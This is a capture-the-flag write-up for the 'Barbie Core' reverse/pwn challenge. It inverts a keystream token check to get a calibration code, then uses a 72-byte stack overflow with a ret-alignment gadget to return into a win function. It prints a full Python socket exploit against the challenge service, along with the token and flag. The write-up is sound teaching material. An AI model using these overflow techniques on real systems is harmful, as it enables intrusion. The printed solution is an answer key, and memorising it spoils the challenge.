# Barbie Core — Calibration Bypass + Ret2Win Overflow

- **Platform:** Riffhack CTF (Biterra) — team `ZKaMYBbs`
- **Author:** CL4Y
- **Artifact:** `barbie_core.b64` (base64-wrapped ELF64, x86-64, 16 680 bytes, not stripped)
- **Service:** `162.243.100.178:5000`
- **Category:** Reverse + pwn — solve a keystream check, then stack-overflow into a win function
- **Flag:** `bitctf{{b4rb13_buff3r_b10w0u7}}`
- **Calibration code:** `B4RB13-C0R3GL4M!`

## Binary recon

```
$ base64 -d barbie_core.b64 > barbie_core
$ checksec --file=barbie_core
RELRO=Partial  Canary=No  NX=Yes  PIE=No
```

Symbols (not stripped):

```
0x401296 rol8
0x4012db check_token
0x4013c3 win                ; getenv(FLAG_PATH) || "/flag.txt" → fopen → fgets → printf
0x40151d vulnerable_prompt  ; read(0, buf64, 0x100)  ← the bug
0x401588 main
```

`main()` reads a 16-byte calibration code, runs it through `check_token`, and
only on success calls `vulnerable_prompt`. The reverse stage is the
`check_token` keystream; the pwn stage is the unbounded `read()` into a
64-byte stack buffer.

## Stage 1 — Reverse `check_token`

Transcribed C from the disassembly:

```c
int check_token(const char *s) {
    if (strlen(s) != 16) return 0;
    uint8_t state = 0x42;
    for (int i = 0; i < 16; ++i) {
        uint8_t ebx = (7*i + 0x5a) ^ (uint8_t)s[i];
        uint8_t v   = (uint8_t)(ebx + rol8(state, i % 5));
        if (v != target[i]) return 0;
        state = (uint8_t)(target[i] ^ (state * 33));
    }
    return 1;
}
```

with `rol8(v, n) = ((v << n) | (v >> (8-n))) & 0xff` and
`target = {5a 06 b5 86 17 08 8e ba d6 d4 d7 06 b7 96 38 ae}` from
`__rodata` at `0x402150`.

The function is invertible byte-by-byte because `state` only depends on
*previous* `target` bytes and the constant seed — every step has exactly one
unknown (the byte we want), so reverse the arithmetic:

```python
target = bytes.fromhex("5a06b58617088ebad6d4d706b79638ae")
rol8 = lambda v,n: ((v<<(n&7))|(v>>(8-(n&7))))&0xff if (n&7) else v&0xff

state, sol = 0x42, bytearray()
for i in range(16):
    ebx = (target[i] - rol8(state, i % 5)) & 0xff
    sol.append(ebx ^ ((7*i + 0x5a) & 0xff))
    state = (target[i] ^ (state * 33)) & 0xff

print(bytes(sol))    # b'B4RB13-C0R3GL4M!'
```

So the calibration token is **`B4RB13-C0R3GL4M!`** — sixteen bytes of
Barbie-themed leet that lets us past `check_token`.

## Stage 2 — Pwn `vulnerable_prompt`

```c
void vulnerable_prompt(void) {
    char buf[64];
    puts("Upload pilot profile packet:");
    puts("pilot> ");
    read(0, buf, 0x100);           // ← 256 bytes into 64-byte buffer
    puts("Packet stored.");
}
```

Stack layout: `buf[64]` at `-0x40(%rbp)`, saved RBP at `0(%rbp)`,
return address at `+8(%rbp)` — distance to RIP is **72 bytes**. NX is on
but PIE is off, so the lift is simply to return into `win` (0x4013c3),
which:

```c
void win(void) {
    char *path = getenv("FLAG_PATH"); if (!path || !*path) path = "/flag.txt";
    FILE *fp = fopen(path, "r");
    char buf[128] = {0};
    fgets(buf, 0x80, fp);
    printf("Ancient message recovered: %s\n", buf);
}
```

Same `movaps`-alignment caveat as the Samus challenge — after the `ret` of
`vulnerable_prompt`, RSP is 16-aligned, but `win`'s prologue lands it at
`16k - 0x98`, misaligned by 8. Pre-pending a single bare `ret` gadget
(I used `main+0x14d = 0x4016d5`) consumes one extra slot and rebalances.

Final payload:

```
[ 'A' * 72 ][ 0x4016d5 (ret) ][ 0x4013c3 (win) ]
```

## Exploit

```python
# riffhack/scratch/barbie_pwn.py
import socket, struct
HOST, PORT = "162.243.100.178", 5000
WIN, RET   = 0x4013c3, 0x4016d5
p64 = lambda x: struct.pack("<Q", x)

s = socket.create_connection((HOST, PORT))

# Stage 1: calibration
def until(m):
    b=b""
    while m not in b: b += s.recv(4096)
    return b
until(b"code> ")
s.sendall(b"B4RB13-C0R3GL4M!\n")
until(b"pilot> ")

# Stage 2: ret2win
s.sendall(b"A"*72 + p64(RET) + p64(WIN))

out=b""
s.settimeout(3)
try:
    while True:
        c=s.recv(4096)
        if not c: break
        out += c
except socket.timeout: pass
print(out.decode())
```

Run:

```
$ python3 barbie_pwn.py
== Barbieland Glam Relay ==
Enter 16-byte glam calibration code:
code> Calibration accepted.
Upload pilot profile packet:
pilot> Packet stored.
Ancient message recovered: bitctf{{b4rb13_buff3r_b10w0u7}}
```

## Take-aways

- Whenever a CTF puts a `check_*` gate in front of a `read()`-into-fixed-
  buffer, the gate is just a key-stretch — invert it byte-by-byte if every
  step has exactly one unknown.
- `rol8(v, n)` looks like a 32-bit `(v << n) | (v >> (8-n))` in C (no
  pre-mask) — the implementation can be sloppy, but only the low byte
  feeds the comparison, so the standard 8-bit rotate works fine.
- For `read()`-vs-`fgets()`, `read` doesn't stop on newlines and doesn't
  null-terminate. Sending raw bytes is fine; no need to pad with newlines.
- Reach for a `ret` aligner whenever you call into a function whose body
  may rely on 16-byte stack alignment.
